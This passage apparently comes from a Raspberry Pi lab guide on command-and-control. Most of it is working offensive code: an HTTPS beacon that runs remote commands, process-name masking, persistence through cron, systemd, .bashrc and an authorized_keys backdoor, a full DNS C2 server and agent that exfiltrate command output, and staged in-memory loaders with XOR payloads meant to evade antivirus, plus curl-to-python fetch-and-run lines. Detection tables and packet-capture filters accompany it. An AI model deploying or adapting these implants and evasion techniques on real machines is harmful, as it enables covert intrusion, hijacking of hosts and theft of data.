requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

C2 = "https://10.0.0.10:8443"   # HTTPS: body encrypted, Suricata blind
ENDPOINTS = ["/api/v1/status", "/api/v1/health", "/healthz"]
HEADERS = {"User-Agent": "Mozilla/5.0 ...", "Content-Type": "application/json"}

while True:
    try:
        r = requests.get(f"{C2}{random.choice(ENDPOINTS)}", headers=HEADERS, verify=False)
        task_b64 = r.json().get("config", {}).get("interval", "")
        if task_b64:
            cmd = base64.b64decode(task_b64).decode()
            output = __import__('subprocess').getoutput(cmd)
            payload = json.dumps({
                "node_id": f"rpi-{random.randint(1000,9999)}",
                "metrics": base64.b64encode(output.encode()).decode(),
                "ts": int(__import__('time').time())
            })
            requests.post(f"{C2}{random.choice(ENDPOINTS)}",
                         data=payload, headers=HEADERS, verify=False)
    except Exception: pass
    time.sleep(random.randint(180, 600))
```

> What actually catches v4: JA3 fingerprinting, direct-to-IP HTTPS (no DNS), NetFlow anomalies.

### Process Name Masking

```python
import sys
sys.argv[0] = '/usr/sbin/cron'
try:
    from setproctitle import setproctitle
    setproctitle('(sd-pam)')
except ImportError: pass
```

```bash
# Defender bypass: exe link still points to python3
ls -la /proc/$(pgrep '(sd-pam)')/exe   # → /usr/bin/python3
```

### Hardened Detection

```bash
sudo apt install -y auditd acct
cat <<'EOF' | sudo tee /etc/audit/rules.d/hardened.rules
-a always,exit -F arch=b64 -S execve -k exec_log
-w /home/pi/.ssh -p r -k ssh_key_read
-w /home/pi/.bash_history -p rwa -k history_access
-w /etc/wpa_supplicant/wpa_supplicant.conf -p r -k wpa_read
EOF
sudo augenrules --load
sudo chattr +a /home/pi/.bash_history   # immutable history
```

---

## Part 14 — Full Packet Capture & C2 Traffic Analysis

```bash
pip3 install scapy
sudo apt install -y tshark wireshark-common
```

### tcpdump

```bash
sudo tcpdump -i eth0 -w /tmp/c2.pcap 'port 8080 or port 443 or port 4444'
# Ring buffer: rotate hourly, 24 files, 100MB max each
sudo tcpdump -i eth0 -w /tmp/c2_%Y%m%d_%H%M%S.pcap -G 3600 -W 24 -C 100 host 10.0.0.10
```

### tshark: Extract Beacon Timing

```bash
tshark -r /tmp/beacons.pcap \
  -Y 'http.request.uri contains "/beacon"' \
  -T fields -e frame.time_epoch -e ip.src -e ip.dst -e frame.len \
  -E separator=, -E header=y
```

### Wireshark Display Filters

```
http.request.uri contains "/beacon"
frame.len == 214
http.upgrade == "websocket"
tcp.port == 7000 && tcp.len > 0 && tcp.len < 30
tls.handshake.type == 1 && ip.dst == 10.0.0.10
```

### Beacon Jitter Analysis (scapy)

```python
#!/usr/bin/env python3
# beacon_jitter.py — Usage: python3 beacon_jitter.py /tmp/beacons.pcap [/beacon]
import sys, statistics
from scapy.all import rdpcap, TCP, Raw

def extract_timestamps(pcap, pattern="/beacon"):
    return sorted(
        float(p.time) for p in rdpcap(pcap)
        if p.haslayer(TCP) and p.haslayer(Raw)
        and "GET" in p[Raw].load.decode("utf-8", errors="ignore")
        and pattern in p[Raw].load.decode("utf-8", errors="ignore")
    )

ts = extract_timestamps(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else "/beacon")
if len(ts) < 2: print(f"Only {len(ts)} beacons found"); sys.exit(1)
intervals = [ts[i+1] - ts[i] for i in range(len(ts)-1)]
mean = statistics.mean(intervals); std = statistics.stdev(intervals)
print(f"Beacons: {len(ts)}\nMean: {mean:.3f}s\nStd dev: {std:.3f}s ({std/mean*100:.1f}% jitter)")
print("[!] Low jitter — easy to fingerprint" if std < 1.0 else "[+] Jitter present")
```

### JA3 Extraction

```bash
tshark -r /tmp/c2_tls.pcap \
  -Y 'tls.handshake.type == 1 || tls.handshake.type == 2' \
  -T fields -e tcp.stream -e ip.src -e ip.dst \
  -e tls.handshake.ja3 -e tls.handshake.ja3s \
  -E separator=, -E header=y | tee /tmp/ja3.csv
```

### Chisel WebSocket Pattern

```bash
tshark -r /tmp/capture.pcap -Y 'http.upgrade == "websocket"' \
  -T fields -e ip.src -e ip.dst -e http.request.uri -e http.user_agent
tcpflow -r /tmp/capture.pcap -o /tmp/flows/ && grep -r "chisel" /tmp/flows/
```

### frp Keepalive Pattern

```bash
tshark -r /tmp/frp.pcap \
  -Y 'tcp.port == 7000 && tcp.len > 0 && tcp.len < 30' \
  -T fields -e frame.time_epoch -e ip.src -e tcp.len
```

---

## Part 15 — Persistence Mechanisms

### 1. Cron

```bash
(crontab -l 2>/dev/null; echo "*/5 * * * * python3 /tmp/agent.py") | crontab -
```

**Detect:** `crontab -l` | `ls /var/spool/cron/crontabs/` | `cat /etc/cron.d/*`

### 2. systemd User Unit

```bash
mkdir -p ~/.config/systemd/user/
cat > ~/.config/systemd/user/agent.service <<'EOF'
[Unit]
Description=System Update Helper
After=network.target
[Service]
Type=simple
ExecStart=/usr/bin/python3 /tmp/agent.py
Restart=on-failure
RestartSec=30
StandardOutput=null
StandardError=null
[Install]
WantedBy=default.target
EOF
systemctl --user daemon-reload
systemctl --user enable agent.service
systemctl --user start agent.service
loginctl enable-linger $(whoami)
```

**Detect:** `systemctl --user list-units --type=service`

### 3. .bashrc/.profile Injection

```bash
cat >> ~/.bashrc <<'EOF'

if ! pgrep -f "agent.py" > /dev/null 2>&1; then
    nohup python3 /tmp/agent.py > /dev/null 2>&1 &
fi
EOF
```

**Detect:** `grep -n "agent\|nohup\|pgrep" ~/.bashrc ~/.profile 2>/dev/null`

### 4. SSH authorized_keys Backdoor

```bash
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
sudo chattr +i ~/.ssh/authorized_keys   # immutable (root)
```

**Detect:** `cat -n ~/.ssh/authorized_keys` | `lsattr ~/.ssh/authorized_keys`

### 5. Python atexit / Signal Re-Fork

```python
import atexit, os, signal, sys

SELF_PATH = os.path.abspath(__file__)

def respawn():
    pid = os.fork()
    if pid == 0:
        os.setsid()
        pid2 = os.fork()
        if pid2 == 0:
            os.execv(sys.executable, [sys.executable, SELF_PATH])
        os._exit(0)

def handle_signal(sig, frame): respawn(); sys.exit(0)

atexit.register(respawn)
signal.signal(signal.SIGTERM, handle_signal)
signal.signal(signal.SIGINT, handle_signal)
# ... beacon loop follows
```

**Detect:** `pkill -9 -f agent.py && sleep 2 && pgrep -a -f agent.py` (still running?)

### Persistence Audit One-Liner

```bash
echo "=== CRON ===" && crontab -l 2>/dev/null; \
echo "=== SYSTEMD ===" && systemctl --user list-units --type=service --no-pager 2>/dev/null; \
echo "=== BASHRC ===" && grep -n "nohup\|agent\|pgrep" ~/.bashrc ~/.profile 2>/dev/null; \
echo "=== AUTHORIZED_KEYS ===" && cat -n ~/.ssh/authorized_keys 2>/dev/null; \
echo "=== RUNNING ===" && pgrep -a -f "agent\.py\|beacon\.py" 2>/dev/null || echo "(none)"
```

---

## Part 16 — DNS C2 Channel

### Why It Bypasses Egress Filters

```
AGENT (10.0.0.21)                        CONTROLLER (10.0.0.10)
─────────────────                        ─────────────────────────
poll: <agentid>.c2.lab TXT ─UDP/53──▶   dnslib server (authoritative)
receive base32-encoded command ◀───────

exfil: <b32chunk>.<seq>.<agentid>.out.c2.lab ──▶ reassemble chunks

Firewall:
  ✗ blocks TCP/80, TCP/443 to unknown IPs
  ✓ allows UDP/53 outbound everywhere
```

```bash
pip3 install dnslib
```

### DNS C2 Server

```python
#!/usr/bin/env python3
# dns_c2_server.py — run as root: sudo python3 dns_c2_server.py
import base64, socketserver, threading
from collections import defaultdict
from dnslib import DNSRecord, DNSError, RR, QTYPE, TXT, A

LISTEN_IP = "0.0.0.0"; LISTEN_PORT = 53
C2_DOMAIN = "c2.lab"; FAKE_A = "10.0.0.10"
command_queue: dict = {}; queue_lock = threading.Lock()
exfil_buffer: dict = defaultdict(dict); exfil_lock = threading.Lock()

def enc(cmd): return base64.b32encode(cmd.encode()).decode().rstrip("=")
def dec_chunk(s):
    s = s.upper()
    return base64.b32decode(s + "=" * ((8 - len(s) % 8) % 8))

class DNSHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data, sock = self.request
        try: req = DNSRecord.parse(data)
        except DNSError: return
        reply = req.reply(); reply.header.aa = 1
        for q in req.questions:
            qname = str(q.qname).lower().rstrip(".")
            qtype = QTYPE[q.qtype]
            if qname.endswith(f".out.{C2_DOMAIN}"):
                inner = qname[:-len(f".out.{C2_DOMAIN}")]; parts = inner.split(".")
                if len(parts) >= 3:
                    try:
                        seq = int(parts[1]); aid = ".".join(parts[2:])
                        with exfil_lock: exfil_buffer[aid][seq] = dec_chunk(parts[0])
                        _reassemble(aid)
                    except Exception: pass
                reply.add_answer(RR(q.qname, QTYPE.A, rdata=A(FAKE_A), ttl=0))
            elif qname.endswith(f".{C2_DOMAIN}") and qtype in ("TXT", "ANY"):
                aid = qname[:-len(f".{C2_DOMAIN}")].lstrip(".")
                with queue_lock: encoded = command_queue.pop(aid, enc("NOP"))
                print(f"[C2] → {aid}: {encoded[:40]}...")
                reply.add_answer(RR(q.qname, QTYPE.TXT, rdata=TXT(encoded.encode()), ttl=0))
            else:
                reply.add_answer(RR(q.qname, QTYPE.A, rdata=A(FAKE_A), ttl=0))
        sock.sendto(reply.pack(), self.client_address)

def _reassemble(aid):
    with exfil_lock:
        seqs = sorted(exfil_buffer[aid].keys())
        if not seqs or seqs[0] != 0 or seqs != list(range(len(seqs))): return
        combined = b"".join(exfil_buffer[aid][s] for s in seqs).rstrip(b"\x00")
        print(f"\n[EXFIL {aid}]\n{combined.decode(errors='replace')}\n[END]")
        exfil_buffer[aid].clear()

def console():
    print("[C2] Format: <agentid> <command>")
    while True:
        try: line = input()
        except EOFError: break
        parts = line.strip().split(" ", 1)
        if len(parts) == 2:
            with queue_lock: command_queue[parts[0]] = enc(parts[1])
            print(f"[C2] queued: {parts[1]}")

if __name__ == "__main__":
    threading.Thread(target=console, daemon=True).start()
    srv = socketserver.UDPServer((LISTEN_IP, LISTEN_PORT), DNSHandler)
    print(f"[C2] DNS C2 on :{LISTEN_PORT}, zone *.{C2_DOMAIN}")
    srv.serve_forever()
```

### DNS C2 Agent

```python
#!/usr/bin/env python3
# dns_c2_agent.py
import base64, socket, subprocess, time, os, uuid, struct, random

C2_DNS = "10.0.0.10"; C2_DOMAIN = "c2.lab"
POLL_INTERVAL = 15; CHUNK_SIZE = 60
AGENT_ID = os.environ.get("AGENT_ID", f"agent-{uuid.uuid4().hex[:6]}")

def b32enc(d): return base64.b32encode(d).decode().rstrip("=")
def b32dec(s):
    s = s.upper(); return base64.b32decode(s + "=" * ((8 - len(s) % 8) % 8))

def dns_txt(fqdn):
    txid = random.randint(1, 65535)
    hdr = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0)
    labels = b"".join(bytes([len(p)]) + p.encode() for p in fqdn.split(".")) + b"\x00"
    pkt = hdr + labels + struct.pack("!HH", 16, 1)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(5)
    try:
        s.sendto(pkt, (C2_DNS, 53)); resp, _ = s.recvfrom(4096)
    except socket.timeout: return ""
    finally: s.close()
    if len(resp) < 12 or struct.unpack("!H", resp[6:8])[0] == 0: return ""
    pos = 12
    while resp[pos]: pos += resp[pos] + 1
    pos += 5
    if resp[pos] & 0xC0 == 0xC0: pos += 2
    else:
        while resp[pos]: pos += resp[pos] + 1
        pos += 1
    pos += 10; txt_len = resp[pos]
    return resp[pos+1:pos+1+txt_len].decode(errors="replace")

def dns_a(fqdn):
    txid = random.randint(1, 65535)
    hdr = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0)
    labels = b"".join(bytes([len(p)]) + p.encode() for p in fqdn.split(".")) + b"\x00"
    pkt = hdr + labels + struct.pack("!HH", 1, 1)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(5)
    try: s.sendto(pkt, (C2_DNS, 53)); s.recvfrom(512)
    except Exception: pass
    finally: s.close()

def exfil(output):
    enc = b32enc(output.encode())
    chunks = [enc[i:i+CHUNK_SIZE] for i in range(0, len(enc), CHUNK_SIZE)] or [""]
    for seq, chunk in enumerate(chunks):
        dns_a(f"{chunk}.{seq}.{AGENT_ID}.out.{C2_DOMAIN}"); time.sleep(0.2)
    dns_a(f"{b32enc(b'x00')}.{len(chunks)}.{AGENT_ID}.out.{C2_DOMAIN}")

if __name__ == "__main__":
    print(f"[agent] DNS C2 ID={AGENT_ID}")
    while True:
        try:
            raw = dns_txt(f"{AGENT_ID}.{C2_DOMAIN}")
            if raw:
                cmd = b32dec(raw).decode()
                if cmd != "NOP":
                    out = subprocess.run(cmd, shell=True, capture_output=True,
                                         text=True, timeout=30)
                    exfil((out.stdout + out.stderr) or "[NO OUTPUT]")
        except Exception: pass
        time.sleep(POLL_INTERVAL)
```

### Lab DNS Setup

```bash
# Quick (resolv.conf — not persistent on systemd-resolved)
sudo bash -c 'echo "nameserver 10.0.0.10" > /etc/resolv.conf'

# Persistent (systemd-resolved, only routes c2.lab)
sudo mkdir -p /etc/systemd/resolved.conf.d
sudo tee /etc/systemd/resolved.conf.d/c2lab.conf <<'EOF'
[Resolve]
DNS=10.0.0.10
Domains=~c2.lab
EOF
sudo systemctl restart systemd-resolved

# dnsmasq on CONTROLLER (forward *.c2.lab to C2, everything else upstream)
sudo apt install -y dnsmasq
echo "server=/c2.lab/127.0.0.1#5353" | sudo tee /etc/dnsmasq.d/c2lab.conf
echo "server=8.8.8.8" | sudo tee -a /etc/dnsmasq.d/c2lab.conf
# Change LISTEN_PORT = 5353 in dns_c2_server.py when using dnsmasq
sudo systemctl restart dnsmasq
```

### Detection

| Indicator | What to look for |
|---|---|
| Query volume | Fixed-interval queries every 15s from one host |
| Long labels | Subdomain labels 50–60 chars (legitimate DNS rarely exceeds 20) |
| TXT queries | Workstation querying TXT for unknown internal domain |
| Base32 charset | Labels containing only `[A-Z2-7]` |
| Sequential labels | `CHUNK.0.agentid.out.c2.lab`, `CHUNK.1...` numbered exfil |

```bash
sudo tcpdump -i eth0 -n 'udp port 53' -w /tmp/dns.pcap
tshark -r /tmp/dns.pcap -T fields -e dns.qry.name \
  | awk -F. '{for(i=1;i<=NF;i++) print length($i), $0}' | sort -rn | head -20
```

---

## Part 17 — Staged Implant Delivery

### Why Stage

```
Stage 0 (stager)    ~30 lines     tiny AV surface, minimal disk footprint
Stage 1 (agent)     full implant  never written to disk, exec()'d in memory
```

AV/EDR only scans what hits disk. Staging keeps the interesting bytes off disk entirely.

### C2 Server Additions

Add to existing Flask `c2_server.py`:

```python
import hashlib, pathlib
STAGE1_PATH = pathlib.Path("/opt/c2/agent.py")

@app.route("/stage1")
def serve_stage1():
    return STAGE1_PATH.read_bytes(), 200, {"Content-Type": "text/plain"}

@app.route("/stage1.sha256")
def serve_stage1_hash():
    return hashlib.sha256(STAGE1_PATH.read_bytes()).hexdigest() + "\n", 200, \
           {"Content-Type": "text/plain"}
```

```bash
# Verify both match
curl http://10.0.0.10:8080/stage1.sha256
curl http://10.0.0.10:8080/stage1 | sha256sum
```

### Stage 0 Stager

```python
#!/usr/bin/env python3
"""Stage 0 — fetch, verify SHA256, exec Stage 1 entirely in memory."""
import urllib.request, hashlib, sys

C2 = "http://10.0.0.10:8080"

def fetch(url):
    with urllib.request.urlopen(url, timeout=10) as r: return r.read()

try:
    expected = fetch(f"{C2}/stage1.sha256").decode().strip()
    code     = fetch(f"{C2}/stage1")
    if hashlib.sha256(code).hexdigest() != expected: sys.exit(1)
    exec(compile(code, "<string>", "exec"), {})
except Exception:
    sys.exit(0)   # fail silently
```

```bash
# Deploy without writing to disk
curl -s http://10.0.0.10:8080/stager.py | python3
```

### In-Memory Execution

```python
exec(compile(stage1_code, "<string>", "exec"), {})
```

- `"<string>"` is a synthetic filename — never created on disk
- Stage 1 bytes exist only in the Python heap
- No `open()`, no file descriptor to the payload

```bash
# During execution: no agent.py fd visible
ls -la /proc/$(pgrep -f stager)/fd
cat /proc/$(pgrep -f stager)/cmdline | tr '\0' ' '
```

### Polymorphic XOR Stub

Re-encode with a fresh random key before each operation — changes all byte signatures.

```python
#!/usr/bin/env python3
# encode_stage1.py — run before each deployment to rotate the key
import os, pathlib
src = pathlib.Path("/opt/c2/agent.py").read_bytes()
key = os.urandom(16)
ks  = (key * (len(src) // 16 + 1))[:len(src)]
pathlib.Path("/opt/c2/agent.xor").write_bytes(bytes(a ^ b for a, b in zip(src, ks)))
pathlib.Path("/opt/c2/agent.key").write_bytes(key)
print(f"Encoded {len(src)} bytes, key={key.hex()}")
```

Add to `c2_server.py`:
```python
@app.route("/stage1.xor")
def serve_xor():
    return pathlib.Path("/opt/c2/agent.xor").read_bytes(), 200, \
           {"Content-Type": "application/octet-stream"}
@app.route("/stage1.key")
def serve_key():
    return pathlib.Path("/opt/c2/agent.key").read_bytes(), 200, \
           {"Content-Type": "application/octet-stream"}
```

**Polymorphic stager:**
```python
#!/usr/bin/env python3
import urllib.request, hashlib, sys

C2 = "http://10.0.0.10:8080"
def fetch(url):
    with urllib.request.urlopen(url, timeout=10) as r: return r.read()
def xor(data, key):
    ks = (key * (len(data) // len(key) + 1))[:len(data)]
    return bytes(a ^ b for a, b in zip(data, ks))

try:
    key = fetch(f"{C2}/stage1.key"); cipher = fetch(f"{C2}/stage1.xor")
    expected = fetch(f"{C2}/stage1.sha256").decode().strip()
    plain = xor(cipher, key)
    if hashlib.sha256(plain).hexdigest() != expected: sys.exit(1)
    exec(compile(plain, "<string>", "exec"), {})
except Exception: sys.exit(0)
```

Run `encode_stage1.py` before each deployment to rotate the XOR key and change all payload bytes.

### Detection

| Layer | Observable |
|---|---|
| Network | Two GETs (`/stage1.sha256`, `/stage1`) before first beacon |
| Process | `python3` with no fd pointing to a `.py` payload |
| Zeek HTTP | `GET /stage1` (200) then silence, then beaconing starts |
| strace | `mmap()`/`execve()` with no preceding `openat()` for the payload |
| YARA | No hits on full agent signature — bytes never on disk |

```bash
tail -f /var/log/nginx/access.log | grep "stage1"
sudo strace -p $(pgrep -f stager) -e trace=execve,openat 2>&1 \
  | grep -v "ENOENT\|/usr/lib\|/proc"
```

---

## Quick-Start Checklist

```bash
# 1. Enable IP forwarding on all Pis
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf && sudo sysctl -p

# 2. Install tools on all Pis
sudo apt install -y proxychains4 redsocks dnsmasq tshark
pip3 install dnslib scapy setproctitle

# 3. Check arch before downloading binaries
uname -m   # aarch64 = arm64, armv7l = armv7

# 4. Start Python C2 on CONTROLLER
python3 c2_server.py &

# 5. Deploy agents
./deploy.sh -t targets.txt

# 6. Graduate to Sliver when comfortable with basics
sudo sliver-server

# 7. DNS C2 lab
sudo python3 dns_c2_server.py &
AGENT_ID=agent1 python3 dns_c2_agent.py &
```
